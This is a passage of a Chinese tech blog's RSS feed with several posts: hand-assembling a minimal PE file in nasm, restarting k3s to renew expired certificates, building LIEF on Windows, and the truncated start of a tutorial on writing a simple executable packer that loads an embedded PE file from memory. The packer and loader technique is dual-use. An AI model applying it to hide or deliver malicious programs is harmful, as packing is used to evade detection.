&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">dd&lt;/span> &lt;span class="mi">1000&lt;/span>&lt;span class="no">h&lt;/span> &lt;span class="c">; virtual size
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="c">; Section 使用的内存大小
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">dd&lt;/span> &lt;span class="mi">1000&lt;/span>&lt;span class="no">h&lt;/span> &lt;span class="c">; virtual address
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="c">; Section 的起始点 RVA
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">dd&lt;/span> &lt;span class="mi">400&lt;/span>&lt;span class="no">h&lt;/span> &lt;span class="c">; sizeof raw data
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="c">; 我们知道对齐到了 400h 且代码肯定比这少, 所以 raw data 必然有 400h 大小
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">dd&lt;/span> &lt;span class="no">code&lt;/span> &lt;span class="c">; pointer to raw data
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="c">; 用 label 告诉汇编器 raw data 的偏移
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">dd&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="c">; pointer to relocations
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">dd&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="c">; pointer to linenum
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">dw&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="c">; number of relocations
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">dw&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="c">; number of linenum
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="no">dd&lt;/span> &lt;span class="mi">0x60000020&lt;/span> &lt;span class="c">; characteristics
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="c">; 含义是：代码段 - 可读
&lt;/span>&lt;span class="c">&lt;/span>
&lt;span class="nf">align&lt;/span> &lt;span class="mi">400&lt;/span>&lt;span class="no">h&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">db&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;span class="c">; align 伪指令，不足的部分填充0, 对齐到 400h
&lt;/span>&lt;span class="c">; 相对文件头到这里, 肯定是不足 400h 的, align 伪指令会填充到满 400h 为止。
&lt;/span>&lt;span class="c">; 这样一来, 整个文件头大小, 正好就是 400h
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="32-编写汇编代码">3.2 编写汇编代码&lt;/h3>
&lt;p>文件头定义完成后，就可以开始写汇编代码了。正常这时候还要处理导入表，但我们跳过了。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="nl">code:&lt;/span>
&lt;span class="nl">.start:&lt;/span>
&lt;span class="nf">xor&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">eax&lt;/span>
&lt;span class="nf">retn&lt;/span>
&lt;span class="nf">align&lt;/span> &lt;span class="mi">400&lt;/span>&lt;span class="no">h&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">db&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="c">; 同样，再次对齐到 400h ，把代码段的剩余部分填充成 0
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>到这里，整个 PE 文件的内容就填写完毕了。&lt;/p>
&lt;p>文件头的绝大多数字段并不是我们关注的对象，计算偏移和对齐是最蛋疼的。&lt;/p>
&lt;h3 id="33-关于对齐的坑">3.3 关于对齐的坑&lt;/h3>
&lt;blockquote>
&lt;p>There are additional restrictions on image files if the SectionAlignment value in the optional header is less than the page size of the architecture. For such files, the location of section data in the file must match its location in memory when the image is loaded, so that the physical offset for section data is the same as the RVA.&lt;/p>
&lt;/blockquote>
&lt;p>微软文档里指出，在 Section 对齐的大小小于体系结构指定的页大小（4K）的时候，会有个额外限制，要求 Section 数据在文件中的偏移 &lt;strong>必须&lt;/strong> 对应在内存中的 RVA 。也就是说，如果 Section 对齐为 1 字节，&lt;code>VirtualAddress&lt;/code> 指定为 1000h，那 Section 数据必须存放在文件的 1000h 偏移处，否则生成的可执行文件会出现“不是有效的Win32应用程序”错误。&lt;/p>
&lt;h3 id="34-其他坑">3.4 其他坑&lt;/h3>
&lt;p>建议不要参考单独的某几篇文章，多找些相关的文章博客和文档，互相对照着看。PE格式错误不会有具体的提示，我也没找到什么好用的工具去检查到底哪儿有错，只能建议多用用 CFF Explorer 和 lief、pefile 这些能检查文件格式的库了，要是这些都不行那就看看16进制编辑器什么的吧，比如 HexWorkshop。IDA 在这儿没啥用。&lt;/p>
&lt;p>另外我还发现1字节对齐的时候，x32dbg 调试会看不到汇编代码，在内存布局里进入自己的PE文件后只能看到PE头，但没有反汇编。不过调试器还是可以正常单步调试和查看寄存器。&lt;/p>
&lt;h3 id="35-编译">3.5 编译&lt;/h3>
&lt;p>上面的汇编代码用 nasm 即可编译，不需要其他编译或链接工具了。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">nasm pe.asm -f bin -o pe.exe
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/nasm%e6%89%8b%e5%86%99%e4%b8%aaPE%e5%8f%af%e6%89%a7%e8%a1%8c%e6%96%87%e4%bb%b6/image-20211013104216658.png"
loading="lazy"
alt="image-20211013104216658"
>&lt;/p>
&lt;p>也可以放进调试器看看。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/nasm%e6%89%8b%e5%86%99%e4%b8%aaPE%e5%8f%af%e6%89%a7%e8%a1%8c%e6%96%87%e4%bb%b6/image-20211013104451137.png"
loading="lazy"
alt="image-20211013104451137"
>&lt;/p>
&lt;p>可以看到，代码段正确出现在 4001000h 这个地址上（基址+1000h），内容也符合我们写的汇编代码。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/nasm%e6%89%8b%e5%86%99%e4%b8%aaPE%e5%8f%af%e6%89%a7%e8%a1%8c%e6%96%87%e4%bb%b6/image-20211013104646905.png"
loading="lazy"
alt="image-20211013104646905"
>&lt;/p>
&lt;p>在内存布局窗口也能看到。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>这是个对 PE 文件格式有所了解后的一个简单应用，原先是只会拿其他编程语言去读 PE 文件头的内容，现在学会了用汇编器去写一个简单的 PE 文件。之所以是汇编器去写，而不是拿 C/C++/Python 去写，还是因为我菜而且懒。好了跳过关于我菜的话题吧。&lt;/p>
&lt;p>参考文档（不分先后）：&lt;/p>
&lt;ul>
&lt;li>&lt;a class="link" href="http://blog.marcinchwedczuk.pl/a-closer-look-at-portable-executable-msdos-stub" target="_blank" rel="noopener"
>http://blog.marcinchwedczuk.pl/a-closer-look-at-portable-executable-msdos-stub&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format" target="_blank" rel="noopener"
>https://docs.microsoft.com/en-us/windows/win32/debug/pe-format&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://reverseengineering.stackexchange.com/questions/11758/how-do-you-calculate-address-start-size-of-pe-section-like-rdata-data" target="_blank" rel="noopener"
>https://reverseengineering.stackexchange.com/questions/11758/how-do-you-calculate-address-start-size-of-pe-section-like-rdata-data&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="http://www.phreedom.org/research/tinype/" target="_blank" rel="noopener"
>http://www.phreedom.org/research/tinype/&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://stackoverflow.com/questions/17456372/create-and-use-sections-for-pe-file-in-assembly-nasm" target="_blank" rel="noopener"
>https://stackoverflow.com/questions/17456372/create-and-use-sections-for-pe-file-in-assembly-nasm&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://bitcodersblog.wordpress.com/2017/05/10/win32-in-nasm-part-1/" target="_blank" rel="noopener"
>https://bitcodersblog.wordpress.com/2017/05/10/win32-in-nasm-part-1/&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>大部分代码其实是来自 tinype，被我调来调去改了很多。自己动手折腾一遍远比走马观花看一遍收获更多，有些实践问题不跟着抄一次改一改是不会发现的。有言道“实践出真知”，虽然说现在有些沙雕把生活经验当成真理导致一帮人捧书本一帮人捧经验，搞得啥事情都非黑即白&amp;hellip;把伟人的话当成互相攻讦的武器。&lt;/p>
&lt;p>淦，好好的学习，结果总结的时候越想越气。&lt;/p>
&lt;p>果然，“人类的悲欢并不相通，我只觉得他们吵闹。”&lt;/p></description></item><item><title>k3s更新客户端证书的偷懒方法</title><link>https://nnnewb.github.io/blog/p/k3s-renew-client-ca-file-the-lazy-way/</link><pubDate>Mon, 11 Oct 2021 13:58:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/k3s-renew-client-ca-file-the-lazy-way/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>今天上内网服务器看了眼，准备调试下新代码，结果发现报错 &lt;code>You must logged in to the server (unauthorized)&lt;/code> 。翻了半天的 &lt;em>KUBECONFIG&lt;/em> 配置，发现啥也没错。换成 &lt;code>/etc/rancher/k3s/k3s.yaml&lt;/code> 也不行。于是查了下 &lt;code>journalctl -r -u k3s&lt;/code> ，发现日志 &lt;code>x509: certificate has expired or not yet valid: current time ...&lt;/code> ，这就明确了是证书过期了。&lt;/p>
&lt;p>于是又找了一圈如何给k3s更新证书，搜 &lt;code>how to renew client-ca-file&lt;/code> 查出来的方法不是 &lt;code>kubeadm&lt;/code> 就是改时间、换证书，总之&amp;hellip;麻烦，而且搜出来的文章可操作性都有点差，真要实践出真知也不能放公司的机器上，搞出点问题还得劝自己心平气和磨上一整天去解决。&lt;/p>
&lt;p>于是终于找到个看起来能行的办法：重启。&lt;/p>
&lt;h2 id="操作">操作&lt;/h2>
&lt;p>这个办法可操作性很强——反正情况不会变得更差了。因为办公室的服务器并不能保证24小时不断电，有时候白天上班机器是关机的，重启k3s无论如何不会导致问题变得更差——就算放着不管，过两天说不定也会断电重启下。&lt;/p>
&lt;p>确认没人用服务之后直接上手。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">sudo systemctl restart k3s
&lt;/code>&lt;/pre>&lt;/div>&lt;p>等待重启完成，测试下新的 &lt;code>k3s.yaml&lt;/code> 能不能正常用。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="nb">export&lt;/span> &lt;span class="nv">KUBECONFIG&lt;/span>&lt;span class="o">=&lt;/span>/etc/rancher/k3s/k3s.yaml
kubectl cluster-info
&lt;/code>&lt;/pre>&lt;/div>&lt;pre>&lt;code>Kubernetes control plane is running at https://192.168.2.175:6443
CoreDNS is running at https://192.168.2.175:6443/api/v1/namespaces/kube-system/services/kube-dns:dns/proxy
Metrics-server is running at https://192.168.2.175:6443/api/v1/namespaces/kube-system/services/https:metrics-server:/proxy
To further debug and diagnose cluster problems, use 'kubectl cluster-info dump'.
&lt;/code>&lt;/pre>&lt;p>其他 &lt;code>get nodes&lt;/code> 之类的命令也顺利完成，剩下就是把新的客户端证书合并到个人的配置里了（对，并不是直接用 &lt;code>/etc/rancher/k3s/k3s.yaml&lt;/code>，我知道有人会这么用）。办法也简单，&lt;code>vim /etc/rancher/k3s/k3s.yaml&lt;/code>，把里面的 &lt;code>users&lt;/code> 键下，&lt;code>default&lt;/code> 用户的信息复制出来，粘贴到个人的 &lt;code>~/.kube/config&lt;/code> 相应位置就好。以前复制过的话，就覆盖掉。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>没啥好总结的，重启大法解决一切问题。不过手动轮换证书的办法也得记录一下，这里留相关的摘要链接。&lt;/p>
&lt;ul>
&lt;li>&lt;a class="link" href="https://kubernetes.io/zh/docs/tasks/administer-cluster/kubeadm/kubeadm-certs/" target="_blank" rel="noopener"
>kubernetes.io/使用 kubeadm 进行证书管理&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://www.ibm.com/docs/en/fci/1.1.0?topic=kubernetes-renewing-cluster-certificates" target="_blank" rel="noopener"
>ibm.com/renewing kubernetes cluster certificates&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://forums.rancher.com/t/how-to-renew-cert-manually/20022" target="_blank" rel="noopener"
>forum.rancher.com/how to renew cert manually?&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>比较好奇的有多个master节点的集群，能通过逐个重启master节点来实现自动更新证书吗？&lt;/p></description></item><item><title>编译LIEF的各种姿势</title><link>https://nnnewb.github.io/blog/p/how-to-compile-lief-on-windows/</link><pubDate>Fri, 08 Oct 2021 16:25:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/how-to-compile-lief-on-windows/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>惯例得有个前言。&lt;/p>
&lt;p>LIEF是一个二进制文件分析和操作库，官方推荐的是 Python 版本，确实更好用，就是类型的问题有点多，而且没附送 &lt;code>.pyi&lt;/code> 导致不大好写。而C++版本就没这问题，C++版本有自己的问题=，=&lt;/p>
&lt;p>一个是官方提供下载的SDK是静态链接的，用到SDK的程序必须指定 &lt;code>/MT&lt;/code> 不然编译器就会抱怨运行库不匹配。虽然看issue里已经有人解决了（&lt;code>-DLIEF_USE_CRT_{DEBUG,RELEASE}=MD/MT&lt;/code>），但CI还是老样子，反正直接下载的SDK用起来就蛋疼，vcpkg 全都是 &lt;code>/MD&lt;/code> 链接的，没法配合用。&lt;/p>
&lt;p>更别提 MinGW 了，就没官方的SDK。&lt;/p>
&lt;p>以上就是问题，解决问题的最简单办法就是自己编译了。&lt;/p>
&lt;h2 id="0x01-visual-c-工具链-msbuild">0x01 Visual C++ 工具链 msbuild&lt;/h2>
&lt;p>代码下载下来之后，用 CMake 去编译。下面的命令都是 Powershell 下的，注意折行用的是反引号 backquote，就是波浪号那个键，和 bash 用 反斜杠不一样。直接复制到命令行是跑不起来的。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="n">cmake&lt;/span> &lt;span class="p">..&lt;/span>
&lt;span class="n">-G&lt;/span> &lt;span class="s2">&amp;#34;Visual Studio 2019&amp;#34;&lt;/span> &lt;span class="c"># Generator，你的工具链，可以用 cmake --help 来看看有哪些可用的&lt;/span>
&lt;span class="n">-A&lt;/span> &lt;span class="n">Win32&lt;/span> &lt;span class="c"># 选择 Visual C++ 工具链的情况下可以用 -A Win32 选择编译32位代码，或者 Win64&lt;/span>
&lt;span class="n">-DCMAKE_BUILD_TYPE&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="n">Debug&lt;/span> &lt;span class="c"># 常用的 Debug/Release/RelWithDebInfo&lt;/span>
&lt;span class="n">-DLIEF_PYTHON_API&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="n">off&lt;/span> &lt;span class="c"># 不编译 Python 模块，这样就不用装 Python 了&lt;/span>
&lt;span class="n">-DLIEF_USE_CRT_DEBUG&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="nb">MD &lt;/span>&lt;span class="c"># 使用 /MD 链接 msvcrt.dll 而不是 libcmt&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>这儿有个坑，用 Visual Studio 这个 Generator 的时候，虽然指定了 &lt;code>CMAKE_BUILD_TYPE&lt;/code>，但实际没什么卵用，还得在编译的时候给参数 &lt;code>--config Debug&lt;/code> 才会真的按 Debug 编译。&lt;/p>
&lt;p>然后是编译命令：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="n">cmake&lt;/span> &lt;span class="p">-&lt;/span>&lt;span class="n">-build&lt;/span> &lt;span class="p">.&lt;/span> &lt;span class="p">-&lt;/span>&lt;span class="n">-config&lt;/span> &lt;span class="n">Debug&lt;/span> &lt;span class="p">-&lt;/span>&lt;span class="n">-target&lt;/span> &lt;span class="n">LIB_LIEF&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>默认用微软的 msbuild 会花很长时间去编译，不嫌麻烦的话可以用 Ninja。&lt;/p>
&lt;p>编译完还不能用，还得先“安装”到一个目录里。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="n">cmake&lt;/span> &lt;span class="p">-&lt;/span>&lt;span class="n">-install&lt;/span> &lt;span class="p">.&lt;/span> &lt;span class="p">-&lt;/span>&lt;span class="n">-config&lt;/span> &lt;span class="n">Debug&lt;/span> &lt;span class="p">-&lt;/span>&lt;span class="n">-prefix&lt;/span> &lt;span class="nb">LIEF-msvc&lt;/span>&lt;span class="n">-debug&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>这样就会把必要的文件给复制到 &lt;code>LIEF-msvc-debug&lt;/code> 这个文件夹里了，参考 LIEF 官方的集成文档，把 &lt;code>LIEF_DIR&lt;/code> 设置成这个文件夹的路径就可以用啦。&lt;/p>
&lt;h2 id="0x02-visual-c-工具链-ninja">0x02 Visual C++ 工具链 ninja&lt;/h2>
&lt;p>使用 CMake + Ninja 的情况下没法用 &lt;code>-A&lt;/code> 去控制编译32位还是64位了，你得先装好 Visual C++ 构建工具，然后打开开发者命令提示符。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/how-to-compile-lief-on-windows/image-20211008160449880.png"
loading="lazy"
alt="image-20211008160449880"
>&lt;/p>
&lt;p>比如想编译32位的就选 &lt;code>x86 native tool command prompt&lt;/code> ，在这个命令提示符里用 cmake 构建。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="n">cmake&lt;/span> &lt;span class="p">..&lt;/span> &lt;span class="n">-G&lt;/span> &lt;span class="n">Ninja&lt;/span> &lt;span class="n">-DCMAKE_BUILD_TYPE&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="n">Debug&lt;/span> &lt;span class="n">-DLIEF_PYTHON_API&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="n">off&lt;/span> &lt;span class="n">-DLIEF_USE_CRT_DEBUG&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="nb">MD
&lt;/span>&lt;span class="nb">&lt;/span>&lt;span class="n">cmake&lt;/span> &lt;span class="p">-&lt;/span>&lt;span class="n">-build&lt;/span> &lt;span class="p">.&lt;/span> &lt;span class="p">-&lt;/span>&lt;span class="n">-target&lt;/span> &lt;span class="n">LIB_LIEF&lt;/span>
&lt;span class="n">cmake&lt;/span> &lt;span class="p">-&lt;/span>&lt;span class="n">-install&lt;/span> &lt;span class="p">.&lt;/span> &lt;span class="p">-&lt;/span>&lt;span class="n">-prefix&lt;/span> &lt;span class="nb">LIEF-msvc&lt;/span>&lt;span class="n">-debug&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>其他和直接用 msvc 没啥区别。&lt;/p>
&lt;h2 id="0x03-mingw-工具链-makefile">0x03 MinGW 工具链 makefile&lt;/h2>
&lt;p>MinGW 工具链其实和 msvc 差不太大。先装 MinGW，推荐 msys2，msys2装好后跑命令 &lt;code>pacman -Sy mingw-w64-i686-toolchain&lt;/code> 就能装上32位的编译工具链了，包括了 &lt;code>gcc&lt;/code>、&lt;code>g++&lt;/code>、&lt;code>mingw32-make&lt;/code> 这些必要的程序。&lt;/p>
&lt;p>完事后把 &lt;code>MinGW&lt;/code> 工具链加到 &lt;code>PATH&lt;/code> 里。一般来说，假如你把 msys2 装到 &lt;code>C:\msys64&lt;/code> 下的话，那要加的路径就是 &lt;code>C:\msys64\mingw32\bin&lt;/code>，自己看看要用的 gcc 放在哪儿呗。&lt;/p>
&lt;p>另外 &lt;code>LIEF_USE_CRT_DEBUG&lt;/code> 这变量也用不到了，&lt;code>MD&lt;/code>还是&lt;code>MT&lt;/code> 这是专供 MSVC 的选择题，MinGW 不管这个。&lt;/p>
&lt;p>接着就可以用 CMake 了。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="n">cmake&lt;/span> &lt;span class="p">..&lt;/span> &lt;span class="n">-G&lt;/span> &lt;span class="s2">&amp;#34;MinGW Makefiles&amp;#34;&lt;/span> &lt;span class="n">-DCMAKE_BUILD_TYPE&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="n">Debug&lt;/span> &lt;span class="n">-DLIEF_PYTHON_API&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="n">off&lt;/span> &lt;span class="s1">&amp;#39;-DCMAKE_C_FLAGS:STRING=&amp;#34;-m32&amp;#34;&amp;#39;&lt;/span> &lt;span class="s1">&amp;#39;-DCMAKE_CXX_FLAGS:STRING=&amp;#34;-m32&amp;#34;&amp;#39;&lt;/span>
&lt;span class="n">cmake&lt;/span> &lt;span class="p">-&lt;/span>&lt;span class="n">-build&lt;/span> &lt;span class="p">.&lt;/span> &lt;span class="p">-&lt;/span>&lt;span class="n">-target&lt;/span> &lt;span class="n">LIB_LIEF&lt;/span>
&lt;span class="n">cmake&lt;/span> &lt;span class="p">-&lt;/span>&lt;span class="n">-install&lt;/span> &lt;span class="p">.&lt;/span> &lt;span class="p">-&lt;/span>&lt;span class="n">-prefix&lt;/span> &lt;span class="nb">LIEF-mingw32&lt;/span>&lt;span class="n">-debug&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>不用担心 CMake 选错工具链，用 &lt;code>MinGW Makefiles&lt;/code> 的情况下会优先考虑 GCC 的。不过还有个老问题：怎么选32位还是64位。答案是设置下 &lt;code>C_FLAGS&lt;/code> 和 &lt;code>CXX_FLAGS&lt;/code> 这两个特殊变量，让编译器加上 &lt;code>-m32&lt;/code> 这个参数，编译出来的就是32位代码了。&lt;/p>
&lt;h2 id="0x04-mingw-工具链-ninja">0x04 MinGW 工具链 Ninja&lt;/h2>
&lt;p>和 &lt;code>MinGW Makefiles&lt;/code> 差不太多，但是 &lt;code>Ninja&lt;/code> 没那么聪明，不知道要用什么编译器，得手动指定。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="n">cmake&lt;/span> &lt;span class="p">..&lt;/span> &lt;span class="n">-G&lt;/span> &lt;span class="n">Ninja&lt;/span> &lt;span class="n">-DCMAKE_BUILD_TYPE&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="n">Debug&lt;/span> &lt;span class="n">-DLIEF_PYTHON_API&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="n">off&lt;/span> &lt;span class="n">-DCMAKE_C_COMPILER&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="n">gcc&lt;/span> &lt;span class="n">-DCMAKE_CXX_COMPILER&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="n">g&lt;/span>&lt;span class="p">++&lt;/span> &lt;span class="s1">&amp;#39;-DCMAKE_C_FLAGS:STRING=&amp;#34;-m32&amp;#34;&amp;#39;&lt;/span> &lt;span class="s1">&amp;#39;-DCMAKE_CXX_FLAGS:STRING=&amp;#34;-m32&amp;#34;&amp;#39;&lt;/span>
&lt;span class="n">cmake&lt;/span> &lt;span class="p">-&lt;/span>&lt;span class="n">-build&lt;/span> &lt;span class="p">.&lt;/span> &lt;span class="p">-&lt;/span>&lt;span class="n">-target&lt;/span> &lt;span class="n">LIB_LIEF&lt;/span>
&lt;span class="n">cmake&lt;/span> &lt;span class="p">-&lt;/span>&lt;span class="n">-install&lt;/span> &lt;span class="p">.&lt;/span> &lt;span class="p">-&lt;/span>&lt;span class="n">-prefix&lt;/span> &lt;span class="nb">LIEF-mingw32&lt;/span>&lt;span class="n">-debug&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>配置阶段多出来两个参数，&lt;code>-DCMAKE_C_COMPILER=gcc -DCMAKE_CXX_COMPILER=g++&lt;/code>，目的就是告诉 CMake 放机灵点，用 &lt;code>gcc/g++&lt;/code> 编译器，别瞎整。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>也就这么回事吧。&lt;/p></description></item><item><title>加壳原理02 - 简单加壳机</title><link>https://nnnewb.github.io/blog/p/learning-packer-02/</link><pubDate>Tue, 28 Sep 2021 16:57:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/learning-packer-02/</guid><description>&lt;img src="https://nnnewb.github.io/blog/p/learning-packer-02/cover.jpg" alt="Featured image of post 加壳原理02 - 简单加壳机" />&lt;h2 id="前言">前言&lt;/h2>
&lt;p>对 Windows 程序的加载和运行过程有了基本了解后，手动加载并运行一个PE文件并不成问题。加壳仅仅是在这上面更进一步：把加载程序和被加载的程序合并成一个文件。&lt;/p>
&lt;p>这么说可能有点太简单化，大部分的工作其实就在这儿：如何处理被加载的程序？压缩？加密？混淆？加载器（或者叫壳程序）如何反调试？&lt;/p>
&lt;p>这里先写一个简单的加壳机，仅仅是把被加载的PE文件作为一个 Section，添加到壳程序里，让壳程序直接从这个 Section 加载并运行。其他花里胡哨的操作都先不整，仅作为证明工作原理的案例。&lt;/p>
&lt;h2 id="0x01-壳程序">0x01 壳程序&lt;/h2>
&lt;h3 id="11-思路">1.1 思路&lt;/h3>
&lt;p>和加载一个PE文件不同，既然被加载的程序就在 Section 里，那需要做的只有定位到 Section，然后把 Section 内容当读取进内存的 PE 文件内容处理就好了。&lt;/p>
&lt;p>壳程序应该尽量保持轻量，不在原始程序上添加太多东西（加完壳大小翻一倍还多了一堆DLL依赖那谁受得了啊），所以很多标准C库的函数也不能用了，像是&lt;code>memcpy&lt;/code>、&lt;code>strcmp&lt;/code> 都要自己简单实现一个。&lt;/p>
&lt;h3 id="12--壳实现">1.2 壳实现&lt;/h3>
&lt;p>绝大部分内容和之前文章中的 &lt;code>load_PE&lt;/code> 一致，入口点修改为 &lt;code>_start&lt;/code>，需要注意。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;Windows.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;winnt.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nf">load_PE&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">PE_data&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="kt">void&lt;/span> &lt;span class="nf">fix_iat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p_image_base&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">IMAGE_NT_HEADERS&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p_NT_headers&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="kt">void&lt;/span> &lt;span class="nf">fix_base_reloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p_image_base&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">IMAGE_NT_HEADERS&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p_NT_headers&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="nf">mystrcmp&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">const&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">str1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">const&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">str2&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="kt">void&lt;/span> &lt;span class="nf">mymemcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">dest&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">const&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">src&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">size_t&lt;/span> &lt;span class="n">length&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="nf">_start&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">unpacker_VA&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">GetModuleHandleA&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">NULL&lt;/span>&lt;span class="p">);&lt;/span>
